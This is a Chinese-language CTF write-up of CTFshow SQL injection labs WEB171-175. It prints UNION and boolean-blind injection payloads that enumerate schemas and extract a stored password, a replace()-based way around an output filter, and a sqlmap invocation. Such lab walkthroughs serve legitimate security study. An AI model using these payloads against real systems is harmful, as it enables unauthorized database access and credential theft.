---
{"dg-publish":true,"title":"CTFshow_SQL注入_无过滤注入","dg-path":"安全/靶场/CTFshow_SQL注入_无过滤注入.md","permalink":"/安全/靶场/CTFshow_SQL注入_无过滤注入/","dgPassFrontmatter":true}
---

# WEB171 无过滤注入1
![Pasted image 20240810101131.png](/img/user/picture/Pasted%20image%2020240810101131.png)
![Pasted image 20240810101148.png](/img/user/picture/Pasted%20image%2020240810101148.png)
这里给了查询语句，但是这个和真实的查询语句好像其实并不相同
这里给的信息也就是在这个表中应该是有一个username叫flag的用户，而这个查询语句不会显示这个用户，我们应该想办法让他显示出来



尝试使用
```
1 ' #
```
闭合，发现报错

使用
```
1 ' --+
```
闭合，成功
![Pasted image 20240810101410.png](/img/user/picture/Pasted%20image%2020240810101410.png)

再使用order by 查看字段数
```
1 ' order by 3--+    成功
1 ' order by 4--+    报错
```


使用联合查询union获取信息

获取数据库名 `ctfshow_web`
```
0 ' union select 1,database(),3 --+
```
![Pasted image 20240810101839.png](/img/user/picture/Pasted%20image%2020240810101839.png)

获取表名 `ctfshow_user`
```
0 ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

![Pasted image 20240810102102.png](/img/user/picture/Pasted%20image%2020240810102102.png)


获取表的字段名`id,username,password`

```
0 ' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_user' --+
```

![Pasted image 20240810102219.png](/img/user/picture/Pasted%20image%2020240810102219.png)


获取这个表中flag用户数据
```
0 ' union select id,username,password from ctfshow_user where username = 'flag' --+
```

![Pasted image 20240810102327.png](/img/user/picture/Pasted%20image%2020240810102327.png)
得到flag





# WEB172 无过滤注入2
![Pasted image 20240810130053.png](/img/user/picture/Pasted%20image%2020240810130053.png)
猫猫，可爱捏



![Pasted image 20240810130118.png](/img/user/picture/Pasted%20image%2020240810130118.png)
这关和上一关挺像的，最大的区别就是如果查询结果的username里面如果有flag，就会被过滤

注意，这一关的字段数只有2
前面思路差不多，后面查询结果使用如下：
```
1 ' union select 1,group_concat(CONCAT_WS(' ', username, password) SEPARATOR ', ') FROM ctfshow_user2 --+
```
![Pasted image 20240810130358.png](/img/user/picture/Pasted%20image%2020240810130358.png)
得到flag



# WEB173 无过滤注入3

![Pasted image 20240810132800.png](/img/user/picture/Pasted%20image%2020240810132800.png)

这题最大的区别就是所有的返回结果里面都不能带有`flag`
所以我们在会出现flag的地方将他base64或者16进制编码一下就可以了

```
1' union select id,hex(username),password from ctfshow_user3 --+

1' union select id,TO_BASE64(username),password from ctfshow_user3 --+
```

![Pasted image 20240810132957.png](/img/user/picture/Pasted%20image%2020240810132957.png)

其实这里因为只有username中会出现flag，所以我们也可以直接干脆只输出password也可以
```
1' union select id,1,password from ctfshow_user3 --+
```
![Pasted image 20240810133142.png](/img/user/picture/Pasted%20image%2020240810133142.png)


# WEB174 无过滤注入4 （布尔盲注方法）

这一关主要的区别是过滤了回显中有**数字**的内容
![Pasted image 20240810232041.png](/img/user/picture/Pasted%20image%2020240810232041.png)


这一关解题思路是盲注(但其实可以有更简单的方法)，可以使用布尔盲注或者时间盲注，由于报错信息有限，所以无法使用报错盲注

![Pasted image 20240810170658.png](/img/user/picture/Pasted%20image%2020240810170658.png)
![Pasted image 20240810170522.png](/img/user/picture/Pasted%20image%2020240810170522.png)
由于
```
1 ' and length(database())=11;--+
1 '  and left(database(),11)='ctfshow_web' --+
```

知道数据库名称`ctfshow_web`


```
查表名
(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)


//就一个表
1' and (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1; --+

//表长13个字符
1 ' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=13; --+

//表名 ctfshow_user4
1 '  and left((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1)='c' --+
...
1 '  and left((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),13)='ctfshow_user4' --+
```


```
查字段

select column_name from information_schema.columns where table_schema=database() and table_name='ctfshow_user4'

//字段数为3
1' and (SELECT COUNT(*) FROM information_schema.columns where table_schema=database() and table_name='ctfshow_user4')=3; --+

//推测字段长度
1 ' and (SELECT length(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 0,1)=2; --+
1 ' and (SELECT length(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 1,1)=8; --+
1 ' and (SELECT length(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 2,1)=8; --+


推测字段名

1 '  and left((SELECT column_name FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 0,1),2)='id' --+
1 '  and left((SELECT column_name FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 1,1),8)='username' --+
1 '  and left((SELECT column_name FROM information_schema.columns WHERE table_schema=database() and table_name='ctfshow_user4' LIMIT 2,1),8)='password' --+
```




```
查数据

select password from ctfshow_user4 where username = 'flag'

//长度45
1 ' and (SELECT length(password) from ctfshow_user4 where username = 'flag' LIMIT 0,1) = 45; --+


//
substr(database(),1,1)='p';
1 ' and substr((SELECT password from ctfshow_user4 where username = 'flag' LIMIT 0,1),1,1) = 'c'; --+
...
```
数据利用brup暴力破解出来的
![Pasted image 20240810195651.png](/img/user/picture/Pasted%20image%2020240810195651.png)
![Pasted image 20240810195725.png](/img/user/picture/Pasted%20image%2020240810195725.png)

得到flag
`ctfshow{4a02cc1a-8c70-4d6d-800a-ab1f15790c6a}`



# WEB174 无过滤注入4 （字符替换法）

由于这一关没有办法显示有数字的内容，所以我们想办法讲数字替换为其他字符

![Pasted image 20240810232311.png](/img/user/picture/Pasted%20image%2020240810232311.png)

所以我么可以用replace函数进行替换
==replace函数的用法： replace(原字符串，被替换的字符串，要替换成的字符串)==

```
0 ' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','_a'),'1','_b'),'2','_c'),'3','_d'),'4','_e'),'5','_f'),'6','_g'),'7','_h'),'8','_i'),'9','_j') from ctfshow_user4 where username='flag'--+
```

得到：
```
ctfshow{_i_f_a_b_bf_jb-c_gd_f-_eb_bd-_j_a_i_h-_e_g_a_f_f_bf_jd_e_d_e}
```

使用下面python脚本还原
```python
def restore_password(encoded_password):
    # 创建映射表，将替换的字母还原为数字
    mapping = {
        '_a': '0',
        '_b': '1',
        '_c': '2',
        '_d': '3',
        '_e': '4',
        '_f': '5',
        '_g': '6',
        '_h': '7',
        '_i': '8',
        '_j': '9'
    }

    # 按照映射表还原
    for key, value in mapping.items():
        encoded_password = encoded_password.replace(key, value)

    return encoded_password

# 手动输入要还原的内容
encoded_result = input("请输入要还原的字符串: ")
restored_result = restore_password(encoded_result)
print(f"还原后的密码: {restored_result}")
```

![Pasted image 20240810234019.png](/img/user/picture/Pasted%20image%2020240810234019.png)
还原出flag


# WEB175 无过滤注入5

![Pasted image 20240811010435.png](/img/user/picture/Pasted%20image%2020240811010435.png)
这一题把所有字符都给屏蔽了，所以只能时间盲注了，看WP看可以将数据输出到服务器文件中，但是我没做出来。。。

这里我就只用sqlmap试了一下，因为方便点

```shell
sqlmap -r test.txt  -p "id" --dump -dbs
```

```txt
GET /api/v5.php?id=*&page=1&limit=10 HTTP/1.1
Host: 58ec20e0-2874-4c8e-9fd6-610634b1d475.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://58ec20e0-2874-4c8e-9fd6-610634b1d475.challenge.ctf.show/select-no-waf-5.php
DNT: 1
Connection: close
```

![Pasted image 20240811010704.png](/img/user/picture/Pasted%20image%2020240811010704.png)

